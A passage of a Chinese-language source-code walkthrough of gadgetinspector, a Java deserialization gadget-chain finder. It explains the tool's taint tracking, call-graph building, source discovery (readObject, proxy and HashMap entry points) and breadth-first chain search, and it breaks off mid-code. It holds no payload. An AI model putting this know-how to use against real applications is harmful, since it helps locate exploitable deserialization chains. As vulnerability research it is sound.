回到gi，gadgetinspector是利用ASM来进行方法字节码的分析，主要逻辑是在类PassthroughDiscovery和TaintTrackingMethodVisitor中。特别是TaintTrackingMethodVisitor，它通过==标记追踪JVM虚拟机在执行方法时的stack和localvar==，并最终得到返回结果是否可以被参数标记污染。 不仅仅是信息搜集，还要做污点的信息判断，以及方法间的变量关联。 discover()这段很复杂 写个调用顺序在这： discoverMethodCalls-&gt;MethodCallDiscoveryClassVisitor-&gt;MethodCallDiscoveryMethodVisitor-&gt;更新calledMethods和methodCalls集合; topologicallySortMethodCalls-&gt;获得sortedMethods集合，存放着方法调用链逆拓扑结果 calculatePassthroughDataflow-&gt;PassthroughDataflowClassVisitor-&gt;PassthroughDataflowMethodVisitor 跟进discover方法，可以看到首先对之前的结果进行了加载： 跟进discoverMethodCalls函数： 可以看到又按照访问者模式，进行了ASM分析，跟进MethodCallDiscoveryClassVisitor : 可以看到内部重写了下面的方法，并且会按照顺序进行执行： visit：把当前观察的类名赋值到了this.name visitMethod：继续进一步的对被观察类的每一个方法细节进行观察，传入了当前观察的类名和方法名 visitEnd：除了super，啥也没干 看到在visitMethod时候，进行了MethodCallDiscoveryMethodVisitor，跟进看看： MethodCallDiscoveryMethodVisitor继承了ASM的MethodVisitor的构造函数， 在MethodCallDiscoveryMethodVisitor构造方法执行的时候，会对this.calledMethods集合进行初始化，该集合的主要作用是在被观察方法对其他方法进行调用时（会执行visitMethodInsn方法），用于缓存记录被调用的方法，因此，我们可以看到visitMethodInsn方法中： 理解：calledMethods存放的是被调用的方法，ASM对于正在visit的方法，在visit的时候，如果在方法内出现了调用其他方法的行为，那么就会执行visitMethodInsn方法，它会将被调用的方法记录在calledMethods这个hashset集合内。 并且在构造方法执行的时候，集合calledMethods也会被添加到gadgetinspector.PassthroughDiscovery#methodCalls中，做全局性的收集，因此，最后我们能通过discoverMethodCalls这一个方法，实现对这样一个数据的全量收集： 接下来调用topologicallySortMethodCalls， 跟进去： 这里就开始了重头戏，DFS+逆拓扑。 这里重点参考404的这篇文章，原理讲得很清楚。 在开始逆拓扑之前，可以看到作者首先准备了三个数据结构： dfsStack：栈，用来分析方法调用顺序，也用于在在逆拓扑时候不会形成环 visitedNodes：访问过的结点，在一条调用链出现重合的时候，不会造成重复的排序 sortedMethods：最终逆拓扑排序出来的结果集合 跟进dfsTsort： dfsTsort是一个迭代函数： 判断条件： 对于待分析的方法，如果stack里面已经有了，那就不再入栈了 如果之前已经分析过某方法（visitedNodes已经存在），那么也不会再入栈了 接下来，将待分析方法所调用的所有方法集合都取出来，这里可以说是子方法集合outgoingReferences。 之后开始遍历子方法集合，取出每一个子方法作为参数，开始迭代 这其实就是DFS，当到达一个叶子结点的时候，由于没有子方法，就不会进入到循环，也就不会再次递归。 这时就会弹出栈顶元素，也就是叶子结点，加入到visitedNodes和sortedMethods里面。 生成passthrough数据流图在calculatePassthroughDataflow中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流。注意到下面的序列化决定器，作者内置了三种：JDK、Jackson、Xstream，会根据具体的序列化决定器判定决策过程中的类是否符合对应库的反序列化要求，不符合的就跳过： 对于JDK(ObjectInputStream)，类否继承了Serializable接口 对于Jackson，类是否存在0参构造器 对于Xstream，类名能否作为有效的XML标签 生成passthrough数据流代码： 1final Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = new HashMap&lt;&gt;(); 首先passthroughDataflow主要负责的是存储参数污染结果，key对应方法名，value对应的是可以污染下去的参数索引集合。 接下来，遍历经历过拓扑排序过的方法； 首先第一步会跳过静态初始化代码，因为静态代码块基本上是没法被污染的，直接在类加载阶段就会执行。 第二步在遍历的每个方法过程中，获取它所属的类，对其进行ASM访问者模式的分析： 跟进PassthroughDataflowClassVisitor中分析，重点还是在visitMethod方法中 是这样的，对于每一个类中对的每一个方法都会经历PassthroughDataflowClassVisitor这一步。对于类中的每一个方法都会进行它的方法（例如visit，visitMethod），对于每一个方法都会在visitMethod里面走一遭。 那么对于ASM在观察到每一个方法都会执行visitMethod方法，通过此处重新判断所观察的方法是不是我们想找、所关心的方法，只有我们关心的方法才能继续下去，进入PassthroughDataflowMethodVisitor继续观察。 继续跟进PassthroughDataflowMethodVisitor，可以看到，它继承了TaintTrackingMethodVisitor，并有以下几个方法的实现： visitCode：在进入方法的第一时间，ASM会先调用这个方法 visitInsn：在方法体中，每一个字节码操作指令的执行，ASM都会调用这个方法，return visitFieldInsn：对于字段的调用，ASM都会调用这个方法 visitMethodInsn：方法体内，一旦调用了其他方法，都会触发这个方法的调用 还有一个父类中的方法： visitVarInsn：这个方法在方法体内进行字节码操作变量时，会被调用。 为了实现类似污点分析，去分析参数对方法的污染，其模仿了jvm，实现了两个集合，分别是本地变量表和操作数栈，通过其，实现具体的污点分析，那么具体是怎么进行的呢？ 这里写一下具体细节： visitCode-&gt;gadgetinspector.TaintTrackingMethodVisitor#visitVarInsn(在父类里面)-&gt;visitInsn更新污染表-&gt;gadgetinspector.PassthroughDiscovery#calculatePassthroughDataflow 这里需要跟一下gadgetinspector的逻辑： 首先： 本地变量表：List&lt;Set&gt; localVars; 操作数栈：List&lt;Set&gt; stackVars; 这里借鉴一下threedr3am的例子： 逆拓扑结果： 按照这个例子来分析： A.method1: 第一步，ASM对A.method1进行观察，也就是PassthroughDataflowMethodVisitor进行观察，那么，在其方法被执行开始的时候，会触发PassthroughDataflowMethodVisitor.visitCode方法的调用，在这一步的代码中，会首先对方法是否是static方法等进行判断，接着做了一个操作，就是把入参放到了本地变量表中来，为什么要这样做呢？我们可以想象一下，一个方法内部，能用到的数据要不就是本地变量表的数据，要不就是通过字段调用的数据，那么，在分析调用其他方法，或者对返回值是否会被入参污染时的数据流动，都跟它紧密关联，为什么这样说？根据jvm字节码的操作，在调用方法前，肯定需要对相关参数进行入栈，那入栈的数据从哪里来，必然就是本地变量表或者其他字段(这里的其他字段估计是其他方法的返回值)。那么在形成这样的一个本地变量表之后，就能标识一个方法内部的数据流动，并最终确定污染结果。 上面的这步savedVariableState.localVars.set(index, values);其实就是在局部变量表里面更新索引。 第二步，这里三梦师傅写得很乱，仔细查了一下，visitVarInsn是访问局部变量指令。 局部变量指令是加载loads或存储stores局部变量值的指令。也就是说出现这些ILOAD, LLOAD, FLOAD, DLOAD, ALOAD, ISTORE, LSTORE, FSTORE, DSTORE, ASTORE or RET.指令的时候，可以触发这个方法。 这里继续跟，该到new A().method1(args)调用，JVM会执行指令aload1（将局部变量表1号位置的元素入栈）对其参数args进行入栈，因为args是引用类型，那么操作代码就是Opcodes.ALOAD1，可以看到，代码中，从本地变量表获取了变量索引，并放入到操作数栈中来。 123456789101112131415161718192021222324252627282930313233343536373839404142@Override public void visitVarInsn(int opcode, int var) &#123; // Extend local variable state to make sure we include the variable index for (int i = savedVariableState.localVars.size(); i &lt;= var; i++) &#123; savedVariableState.localVars.add(new HashSet&lt;T&gt;()); &#125; Set&lt;T&gt; saved0; switch(opcode) &#123; case Opcodes.ILOAD: case Opcodes.FLOAD: push(); break; case Opcodes.LLOAD: case Opcodes.DLOAD: push(); push(); break; case Opcodes.ALOAD: push(savedVariableState.localVars.get(var)); break; case Opcodes.ISTORE: case Opcodes.FSTORE: pop(); savedVariableState.localVars.set(var, new HashSet&lt;T&gt;()); break; case Opcodes.DSTORE: case Opcodes.LSTORE: pop(); pop(); savedVariableState.localVars.set(var, new HashSet&lt;T&gt;()); break; case Opcodes.ASTORE: saved0 = pop(); savedVariableState.localVars.set(var, saved0); break; case Opcodes.RET: // No effect on stack break; default: throw new IllegalStateException(\"Unsupported opcode: \" + opcode); &#125; 第三步，这时则需要areturn，弹出操作数栈。执行了areturn方法，那么就会触发visitInsn这个方法，因为返回的是引用类型，那么相应的指令就是Opcodes.ARETURN，可以看到，在这个case中，会从栈顶，获取刚刚入栈（第二步中visitVarInsn从本地变量表获取的参数索引）的参数索引，并存储到returnTaint中，因此，即表示A.method1这个方法的调用，参数索引为1的参数param会污染返回值。 1234567891011121314151617181920@Overridepublic void visitInsn(int opcode) &#123; switch(opcode) &#123; case Opcodes.IRETURN://从当前方法返回int case Opcodes.FRETURN://从当前方法返回float case Opcodes.ARETURN://从当前方法返回对象引用 returnTaint.addAll(getStackTaint(0));//栈空间从内存高位到低位分配空间 break; case Opcodes.LRETURN://从当前方法返回long case Opcodes.DRETURN://从当前方法返回double returnTaint.addAll(getStackTaint(1)); break; case Opcodes.RETURN://从当前方法返回void break; default: break; &#125; super.visitInsn(opcode);&#125; 123456protected Set&lt;T&gt; getStackTaint(int index) &#123; //出栈，index=0为栈顶 return savedVariableState.stackVars.get(savedVariableState.stackVars.size()-1-index);&#125;private final Set&lt;Integer&gt; returnTaint;//被污染的返回数据 第四步，经过return之后，该方法的观察也就结束了，那么，回到gadgetinspector.PassthroughDiscovery#calculatePassthroughDataflow中，对于刚刚放到returnTaint污点分析结果，也会在其方法中，缓存到passthroughDataflow。 123456789ClassReader cr = new ClassReader(inputStream);try &#123; PassthroughDataflowClassVisitor cv = new PassthroughDataflowClassVisitor(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6, method); cr.accept(cv, ClassReader.EXPAND_FRAMES); passthroughDataflow.put(method, cv.getReturnTaint());//缓存方法返回值与哪个参数有关系&#125; catch (Exception e) &#123; LOGGER.error(\"Exception analyzing \" + method.getClassReference().getName(), e);&#125; C.method3: 同method1 B.method2: 先看method2字节码： 这个方法和前面连个都不一样，它内部调用了C.method3方法，因此，污点分析时，具体的细节就又不一样了： 第一步，在其方法被执行开始的时候，同样会触发PassthroughDataflowMethodVisitor.visitCode方法的调用，在其中，也是做了相应的操作，把入参存到了本地变量表中来； 第二步，因为方法内部即将调用C.method3，那么ASM调用visitVarInsn方法，对其参数param进行入栈，因为param是引用类型，那么操作代码就是Opcodes.ALOAD，因此，从第一步保存的本地变量表中获取变量入栈； 这里仔细看，method2 准备调用method3时的状态： 在ALOAD_1这一步之后，localvars=(0.0;1.1);stackVars=(0.0;1.1); 第三步，方法内部调用了C.method3，那么，ASM就会触发visitMethodInsn方法的执行，在这一步，会先对被调用方法的入参进行处理，并把被调用方法的实例放到argTypes的第一个索引位置，后面依次放置其他参数，接着计算返回值大小。然后，因为方法调用，第二步已经把参数入栈stack了，而这些参数都是从本地变量表获取的，那么，可以从栈顶取到相关参数，并认为这些参数是可被控制，也就是被当前调用者caller方法污染的。 这里进入visitMethodInsn方法具体看一下： 执行到这里，argTypes存放的是（Cthis，String） 最后，也就是最重点的一步，从passthroughDataflow中获取了被调用方法的参数污染结果，也就是上一个方法C.method3方法被分析时候，return存储的数据，所以，这里就印证了前面为什么要使用逆拓扑排序，因为如果不这样做的话，C.method3可能在B.method2后被分析，那么，缓存就不可能存在污点分析的结果，那么就没办法对B.method2进行正确的污点分析。接着就是对从缓存取出的污染结果和入参对比，取出相应索引的污点参数，放入到resultTaint中。 gadgetinspector.TaintTrackingMethodVisitor#visitMethodInsn main: 最后需要分析的是main方法的入参args是否会污染到其返回值 第一步，执行visitCode存储入参到本地变量表 第二步，执行visitVarInsn参数入栈 第三步，执行visitMethodInsn调用A.method1，A.method1被污染的返回结果，也就是参数索引会被放在栈顶 第四步，执行visitVarInsn把放在栈顶的污染参数索引，放入到本地变量表 第五步，执行visitVarInsn参数入栈 第六步，执行visitMethodInsn调用B.method2，被污染的返回结果会被放在栈顶 第七步，执行visitInsn，返回栈顶数据，缓存到passthroughDataflow，也就是main方法的污点分析结果 到此，ASM实现方法入参污染返回值的分析就到此为止了。 接下来，passthroughDiscovery.save方法就被调用 1234567public void save() throws IOException &#123; if (passthroughDataflow == null) &#123; throw new IllegalStateException(\"Save called before discover()\"); &#125; DataLoader.saveData(Paths.get(\"passthrough.dat\"), new PassThroughFactory(), passthroughDataflow.entrySet());&#125; 也是通过DataLoader.saveData把结果一行一行的保存到passthrough.dat文件中，而每行数据的序列化，是通过PassThroughFactory实现 最终，这一阶段分析保存下来passthrough.dat文件的数据格式： 1类名 方法名 方法描述 能污染返回值的参数索引1,能污染返回值的参数索引2,能污染返回值的参数索引3... 方法调用探索 CallGraphDiscovery这一步和上一步类似，gadgetinspector 会再次扫描全部的Java方法，但检查的不再是参数与返回结果的关系，而是方法的参数与其所调用的子方法的关系，即子方法的参数是否可以被父方法的参数所影响。 看下面这个例子： 12调用者类名 调用者方法caller 调用者方法描述 被调用者类名 被调用者方法target 被调用者方法描述 调用者方法参数索引 调用者字段名 被调用者方法参数索引Main (Ljava/lang/String;)V main A method1 (Ljava/lang/String;)Ljava/lang/String; 1 1 先看作者给出的例子： 1/AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke： AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，0-&gt;IFn.invoke()@1 这里f是通过this._clojureFnMap(0参)获得的，并且f又作为IFn.invoke()的this(也是0参)，换句话说：AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的零参，表示为0-&gt;IFn.invoke()@0 2/FnCompose.invoke与子方法IFn.invoke： 首先先看最里面，f1.invoke(arg)的参数arg为IFn.invoke(Object arg)的参数 都是1参 所以 1-&gt;IFn.invoke()@1 第二层，f1.invoke(arg)里面的f1，是FnCompose的类属性 属于0参 在f1.invoke(arg)里面也是this，所以0-&gt;IFn.invoke()@0 第三层，f2.invoke(f1.invoke(arg))，这里面 f1.invoke(arg)按道理是作为1参，但是对于f1反序列化来说，我们可以控制具体是IFn的哪个实现类，所以这里f1.invoke(arg)也可以看成是0参(一种合理的风险推测)，所以是0-&gt;IFn.invoke()@1 具体看源码 discover-&gt;ModelGeneratorClassVisitor 直接跟gadgetinspector.CallGraphDiscovery#discover： 12345678//加载所有方法信息Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();//加载所有类信息Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();//加载所有父子类、超类、实现类关系InheritanceMap inheritanceMap = InheritanceMap.load();//加载所有方法参数和返回值的污染关联Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load(); 接着遍历每一个class，并对其使用ASM进行观察： ModelGeneratorClassVisitor实现主要就是对每一个方法都进行了ASM的观察： ModelGeneratorMethodVisitor的实现，是这一步的重点逻辑所在，因为单单文字描述可能理解不太清楚，这边继续以一个例子进行讲解： 可以看到上述例子中，Main的main方法中，调用了A.method1方法，并且入参是main的参数args以及Main的字段name ASM的实现流程： 在Main.main方法体被观察到的第一时间，ASM会调用ModelGeneratorMethodVisitor.visitCode，在这个方法中，根据参数的数量，一一形成名称arg0、arg1…，然后放入到本地变量表，本地变量表现在是0:arg0，1:args; 1234567891011121314151617@Overridepublic void visitCode() &#123; super.visitCode(); int localIndex = 0; int argIndex = 0; //使用arg前缀来表示方法入参，后续用于判断是否为目标调用方法的入参 if ((this.access &amp; Opcodes.ACC_STATIC) == 0) &#123; setLocalTaint(localIndex, \"arg\" + argIndex); localIndex += 1; argIndex += 1; &#125; for (Type argType : Type.getArgumentTypes(desc)) &#123; setLocalTaint(localIndex, \"arg\" + argIndex); localIndex += argType.getSize(); argIndex += 1; &#125;&#125; 接着，因为即将要调用A.method1，ASM会调用visitVarInsn，先是aload_1将本地变量表中1号索引args入栈，然后aload_0将arg0入栈。 然后，ASM调用visitVarInsn把当前实例对应的参数入栈，上一步visitCode已经把实例命名为arg0存在本地变量表中，因此入栈的参数名称为arg0，接下来会执行getfield指令，对应调用ASM内部的visitFieldInsn获取字段name，并命名为arg0.name入栈。这里详细说一下，作者这里判断了字段是否是transient的。 transient修饰符通常用于在那些实现了序列化接口的类中，不想被序列化的field。 一旦被transient修饰过后的变量，该变量内容在序列化后无法获得访问。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748switch (opcode) &#123; case Opcodes.GETSTATIC: break; case Opcodes.PUTSTATIC: break; case Opcodes.GETFIELD: Type type = Type.getType(desc);//获取字段类型 if (type.getSize() == 1) &#123; //size=1可能为引用类型 Boolean isTransient = null; // If a field type could not possibly be serialized, it's effectively transient //判断调用的字段类型是否可序列化 if (!couldBeSerialized(serializableDecider, inheritanceMap, new ClassReference.Handle(type.getInternalName()))) &#123; isTransient = Boolean.TRUE; &#125; else &#123; //若调用的字段可被序列化，则取当前类实例的所有字段，找出调用的字段，去判断是否被标识了transient ClassReference clazz = classMap.get(new ClassReference.Handle(owner)); while (clazz != null) &#123; //遍历字段，判断是否是transient类型，以确定是否可被序列化 for (ClassReference.Member member : clazz.getMembers()) &#123; if (member.getName().equals(name)) &#123; isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != 0; break; &#125; &#125; if (isTransient != null) &#123; break; &#125; //若找不到字段，则向上父类查找，继续遍历 clazz = classMap.get(new ClassReference.Handle(clazz.getSuperClass())); &#125; &#125; Set&lt;Integer&gt; taint; if (!Boolean.TRUE.equals(isTransient)) &#123; //若不是Transient字段，则从栈顶取出它，取出的是this或某实例变量，即字段所属实例 taint = getStackTaint(0); &#125; else &#123; taint = new HashSet&lt;&gt;(); &#125; super.visitFieldInsn(opcode, owner, name, desc); //在调用方法前，都会先入栈，作为参数 setStackTaint(0, taint); return; &#125; break; getfield之后，就是调用method1方法，对应的JVM指令是invokevirtual，所以ASM调用visitMethodInsn，因为Main.main调用了A.method1，在这里个环境，清楚的用代码解释了为什么前面需要把参数命名为arg0、arg1、arg0.name这样，因为需要通过这样的一个字符串名称，和被调用方法的入参进行关联，并最终形成调用者和被调用者直接的参数关联。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960@Overridepublic void visitMethodInsn(int opcode, String owner, String name, String desc, boolean itf) &#123; //获取被调用method的参数和类型，非静态方法需要把实例类型放在第一个元素 Type[] argTypes = Type.getArgumentTypes(desc); if (opcode != Opcodes.INVOKESTATIC) &#123; Type[] extendedArgTypes = new Type[argTypes.length+1]; System.arraycopy(argTypes, 0, extendedArgTypes, 1, argTypes.length); extendedArgTypes[0] = Type.getObjectType(owner); argTypes = extendedArgTypes; &#125; switch (opcode) &#123; case Opcodes.INVOKESTATIC: case Opcodes.INVOKEVIRTUAL: case Opcodes.INVOKESPECIAL: case Opcodes.INVOKEINTERFACE: int stackIndex = 0; for (int i = 0; i &lt; argTypes.length; i++) &#123; //最右边的参数，就是最后入栈，即在栈顶 int argIndex = argTypes.length-1-i; Type type = argTypes[argIndex]; //操作数栈出栈，调用方法前，参数都已入栈 Set&lt;String&gt; taint = getStackTaint(stackIndex); if (taint.size() &gt; 0) &#123; for (String argSrc : taint) &#123; //取出出栈的参数，判断是否为当前方法的入参，arg前缀 if (!argSrc.substring(0, 3).equals(\"arg\")) &#123; throw new IllegalStateException(\"Invalid taint arg: \" + argSrc); &#125; int dotIndex = argSrc.indexOf('.'); int srcArgIndex; String srcArgPath; if (dotIndex == -1) &#123; srcArgIndex = Integer.parseInt(argSrc.substring(3)); srcArgPath = null; &#125; else &#123; srcArgIndex = Integer.parseInt(argSrc.substring(3, dotIndex)); srcArgPath = argSrc.substring(dotIndex+1); &#125; //记录参数流动关系 //argIndex：当前方法参数索引，srcArgIndex：对应上一级方法的参数索引 discoveredCalls.add(new GraphCall( new MethodReference.Handle(new ClassReference.Handle(this.owner), this.name, this.desc), new MethodReference.Handle(new ClassReference.Handle(owner), name, desc), srcArgIndex, srcArgPath, argIndex)); &#125; &#125; stackIndex += type.getSize(); &#125; break; default: throw new IllegalStateException(\"Unsupported opcode: \" + opcode); &#125; super.visitMethodInsn(opcode, owner, name, desc, itf);&#125;&#125; 到此，gadgetinspector.CallGraphDiscovery#discover方法就结束了，然后执行gadgetinspector.CallGraphDiscovery#save对调用者-被调用者参数关系数据进行保存到callgraph.dat文件，其中数据的序列化输出格式，由GraphCall.Factory实现: 数据格式： 12调用者类名 调用者方法caller 调用者方法描述 被调用者类名 被调用者方法target 被调用者方法描述 调用者方法参数索引 调用者字段名 被调用者方法参数索引Main (Ljava/lang/String;)V main A method1 (Ljava/lang/String;)Ljava/lang/String; 1 1 利用链入口搜索 SourceDiscovery在这一个阶段中，会扫描所有的class，把符合，也就是可被反序列化并且可以在反序列化执行的方法，全部查找出来，因为没有这样的入口，就算存在执行链，也没办法通过反序列化的时候进行触发。 因为入口的触发，不同的反序列化方式会存在不同是实现，因此，在gadgetinspector中，存在着多个SourceDiscovery的实现，有jackson的，java原生序列化的等等，这里主要以jackson的SourceDiscovery实现开始分析。 这一步会根据已知的反序列化漏洞的入口，检查所有可以被触发的方法。例如，在利用链中使用代理时，任何可序列化并且是java/lang/reflect/InvocationHandler子类的invoke方法都可以视为source。这里还会根据具体的反序列化库决定类是否能被序列化。 这里就是首先去查看想要找哪一种类型的反序列化漏洞入口点， 跟进config.getSourceDiscovery看一眼： 先看SourceDiscovery抽象类： 123456789101112131415161718192021222324public abstract class SourceDiscovery &#123; private final List&lt;Source&gt; discoveredSources = new ArrayList&lt;&gt;(); protected final void addDiscoveredSource(Source source) &#123; discoveredSources.add(source); &#125; public void discover() throws IOException &#123; Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses(); Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); InheritanceMap inheritanceMap = InheritanceMap.load(); discover(classMap, methodMap, inheritanceMap); &#125; public abstract void discover(Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap); public void save() throws IOException &#123; DataLoader.saveData(Paths.get(\"sources.dat\"), new Source.Factory(), discoveredSources); &#125;&#125; 可以看到它的discover实现中，加载了所有的类、方法、继承实现关系数据，接着调用抽象方法discover，然后，我们跟进jackson的具体实现中： 从上述代码可以看出，实现非常之简单，只是判断了方法： 是否无参构造方法 是否getter方法 是否setter方法 为什么对于source会做这样的判断？因为对于jackson的反序列化，在其反序列化时，必须通过无参构造方法反序列化（没有则会反序列化失败），并且会根据一定情况调用其反序列化对象的getter、setter方法。 这里SourceDiscovery是一个抽象类，具体情况具体继承分析，看一下它的的一个简单继承SimpleSourceDiscovery： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class SimpleSourceDiscovery extends SourceDiscovery &#123; @Override public void discover(Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap) &#123; final SerializableDecider serializableDecider = new SimpleSerializableDecider(inheritanceMap); for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(\"finalize\") &amp;&amp; method.getDesc().equals(\"()V\")) &#123; addDiscoveredSource(new Source(method, 0)); &#125; &#125; &#125; // If a class implements readObject, the ObjectInputStream passed in is considered tainted // 如果类实现了readObject，则传入的ObjectInputStream被认为是污染的 for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(\"readObject\") &amp;&amp; method.getDesc().equals(\"(Ljava/io/ObjectInputStream;)V\")) &#123; addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // Using the proxy trick, anything extending serializable and invocation handler is tainted. // 使用动态代理trick时，任何扩展了serializable and InvocationHandler的类会受到污染。 for (ClassReference.Handle clazz : classMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(clazz)) &amp;&amp; inheritanceMap.isSubclassOf(clazz, new ClassReference.Handle(\"java/lang/reflect/InvocationHandler\"))) &#123; MethodReference.Handle method = new MethodReference.Handle( clazz, \"invoke\", \"(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;\"); addDiscoveredSource(new Source(method, 0)); &#125; &#125; // hashCode() or equals() are accessible entry points using standard tricks of putting those objects into a HashMap. // hashCode（）或equals（）是将对象放入HashMap的标准技巧的可访问入口点 for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(\"hashCode\") &amp;&amp; method.getDesc().equals(\"()I\")) &#123; addDiscoveredSource(new Source(method, 0)); &#125; if (method.getName().equals(\"equals\") &amp;&amp; method.getDesc().equals(\"(Ljava/lang/Object;)Z\")) &#123; addDiscoveredSource(new Source(method, 0)); addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the // args are tainted. // 使用比较器代理，可以跳转到任何groovy Closure的call()/doCall()方法，所有的args都被污染 // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference())) &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle(\"groovy/lang/Closure\")) &amp;&amp; (method.getName().equals(\"call\") || method.getName().equals(\"doCall\"))) &#123; addDiscoveredSource(new Source(method, 0)); Type[] methodArgs = Type.getArgumentTypes(method.getDesc()); for (int i = 0; i &lt; methodArgs.length; i++) &#123; addDiscoveredSource(new Source(method, i + 1)); &#125; &#125; &#125; &#125; 在扫描所有的方法后，具备条件的method都会被添加到gadgetinspector.SourceDiscovery#discoveredSources中，并最后通过gadgetinspector.SourceDiscovery#save保存 最终输出到sources.dat文件的数据形式： 1类名 方法名 方法描述 污染参数索引 gadgets挖掘阶段-GadgetChainDiscovery这一步会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink中的方法。 分析gadgetinspector.GadgetChainDiscovery#discover代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106public void discover() throws Exception &#123; Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); InheritanceMap inheritanceMap = InheritanceMap.load(); Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations( inheritanceMap, methodMap);//得到方法的所有子类方法实现（被子类重写的方法） final ImplementationFinder implementationFinder = config.getImplementationFinder( methodMap, methodImplMap, inheritanceMap); //将方法的所有子类方法实现保存到methodimpl.dat try (Writer writer = Files.newBufferedWriter(Paths.get(\"methodimpl.dat\"))) &#123; for (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123; writer.write(entry.getKey().getClassReference().getName()); writer.write(\"\\t\"); writer.write(entry.getKey().getName()); writer.write(\"\\t\"); writer.write(entry.getKey().getDesc()); writer.write(\"\\n\"); for (MethodReference.Handle method : entry.getValue()) &#123; writer.write(\"\\t\"); writer.write(method.getClassReference().getName()); writer.write(\"\\t\"); writer.write(method.getName()); writer.write(\"\\t\"); writer.write(method.getDesc()); writer.write(\"\\n\"); &#125; &#125; &#125; //方法调用map，key为父方法，value为子方法与父方法参数传递关系 Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = new HashMap&lt;&gt;(); for (GraphCall graphCall : DataLoader.loadData(Paths.get(\"callgraph.dat\"), new GraphCall.Factory())) &#123; MethodReference.Handle caller = graphCall.getCallerMethod(); if (!graphCallMap.containsKey(caller)) &#123; Set&lt;GraphCall&gt; graphCalls = new HashSet&lt;&gt;(); graphCalls.add(graphCall); graphCallMap.put(caller, graphCalls); &#125; else &#123; graphCallMap.get(caller).add(graphCall); &#125; &#125; //exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链 Set&lt;GadgetChainLink&gt; exploredMethods = new HashSet&lt;&gt;(); LinkedList&lt;GadgetChain&gt; methodsToExplore = new LinkedList&lt;&gt;(); //加载所有sources，并将每个source作为每条链的第一个节点 for (Source source : DataLoader.loadData(Paths.get(\"sources.dat\"), new Source.Factory())) &#123; GadgetChainLink srcLink = new GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex()); if (exploredMethods.contains(srcLink)) &#123; continue; &#125; methodsToExplore.add(new GadgetChain(Arrays.asList(srcLink))); exploredMethods.add(srcLink); &#125; long iteration = 0; Set&lt;GadgetChain&gt; discoveredGadgets = new HashSet&lt;&gt;(); //使用广度优先搜索所有从source到sink的调用链 while (methodsToExplore.size() &gt; 0) &#123; if ((iteration % 1000) == 0) &#123; LOGGER.info(\"Iteration \" + iteration + \", Search space: \" + methodsToExplore.size()); &#125; iteration += 1; GadgetChain chain = methodsToExplore.pop();//从队首弹出一条链 GadgetChainLink lastLink = chain.links.get(chain.links.size()-1);//取这条链最后一个节点 Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);//获取当前节点方法所有子方法与当前节点方法参数传递关系 if (methodCalls != null) &#123; for (GraphCall graphCall : methodCalls) &#123; if (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123; //如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过 continue; &#125; Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());//获取子方法所在类的所有子类重写方法 for (MethodReference.Handle methodImpl : allImpls) &#123; GadgetChainLink newLink = new GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());//新方法节点 if (exploredMethods.contains(newLink)) &#123; //如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加... continue; &#125; 